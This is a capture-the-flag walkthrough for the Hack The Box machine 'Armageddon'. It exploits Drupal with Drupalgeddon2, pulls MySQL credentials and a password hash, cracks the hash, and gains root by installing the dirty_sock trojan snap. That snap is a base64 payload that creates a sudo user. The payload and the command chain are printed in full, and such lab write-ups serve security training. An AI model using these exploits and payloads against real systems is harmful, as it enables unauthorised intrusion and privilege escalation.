![Armageddon.PNG](/assets/Machines/Easy/Armageddon/Armageddon.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.233
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.233
```

**Output**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

3. Visit web page

![web.PNG](/assets/Machines/Easy/Armageddon/web.PNG)


* Try with defaults credentials like
```bash
admin:admin
admin:root
root:root
```

4. Search any exploit for **Drupal Armageddon** [Exploit](https://github.com/dreadlocked/Drupalgeddon2)

```bash
┌──(root㉿kali)-[/home/…/Machines/Easy/Armageddon/Drupalgeddon2]
└─| ruby drupalgeddon2.rb http://<IP Machine>
```

**Output**
```bash
armageddon.htb>> whoami
apache
```

5. Search for any setting file. (This files sometimes contains credentials)
```bash
armageddon.htb>> find / -name '*settings*' | grep -vE 'denied'
```

**Output**
```bash
/var/www/html/modules/update/update.settings.inc
/var/www/html/sites/default/default.settings.php
/var/www/html/sites/default/settings.php
/var/www/html/themes/garland/theme-settings.php
```

6. In `/var/www/html/sites/default/settings.php` we found credentials to login in mysql

![creds.PNG](/assets/Machines/Easy/Armageddon/creds.PNG)

7. Use **mysql** to execute commands liek this:
```bash
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'SHOW DATABASES;'
```

**Output**
```bash
information_schema
drupal
mysql
performance_schema
```

8. Search credentials of other user
```bash
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'USE drupal; SELECT * FROM users;'
```

**Output**
```bash
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
0                                               NULL    0       0       0       0       NULL            0               NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276  1Europe/London           0       admin@armageddon.eu     a:1:{s:7:"overlay";i:1;}
```

9. Password of user **brucetherealadmin** is hashed, crack with john
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Armageddon]
└─| john -w=/home/kali/Desktop/rockyou.txt hash
```

**Output**
```bash
booboo
```

10. Login with ssh 
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Armageddon]
└─| ssh brucetherealadmin@<IP Machine>
```

**Output**
```bash
[brucetherealadmin@armageddon ~]$
```

11. Cat flag user
```bash
[brucetherealadmin@armageddon ~]$ cat user.txt 
```

**Output**
```
d3788af678867a828ec44ab15f216ca7
```


---
---
---
### **Privileges Escalation** 💀

1. Search SUID permissions
```bash
[brucetherealadmin@armageddon root]$ sudo -l
```

**Output**
```bash
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *

```

2. Copy the **TROJAN_SNAP** part of this code [Dirty_Sock](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py)

```python
┌──(root㉿kali)-[/home/…/Machines/Easy/Armageddon/Drupalgeddon2]
└─| python -c "print('''    
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
               + 'A' * 4256 + '==')" > trojan.snap
```

3. Copy content of `trojan.snap` and enconde in base64.
```bash
┌──(root㉿kali)-[/home/…/Machines/Easy/Armageddon/Drupalgeddon2]
└─| base64 -w 0 trojan.snap
```

4. Put the output into **tmp** directory of target machine and put execute permission and execute **trojan.snap**
```bash
[brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install --devmode trojan.snap
```

5. In this moment in the machine has been created a new user `dirty_sock`
6. Migrate to new user (Password is `dirty_sock`)
```bash
[brucetherealadmin@armageddon tmp]$ su dirty_sock
Password: 
[dirty_sock@armageddon tmp]$
```

7. Convert into user root
```bash
[dirty_sock@armageddon tmp]$ sudo -i
```

**Output**
```bash
[root@armageddon ~]| whoami
root
```

8. Cat root flag
```bash
[root@armageddon ~]| cat root.txt 
ddb85324a3f97cffd9daa6c6a901802a
```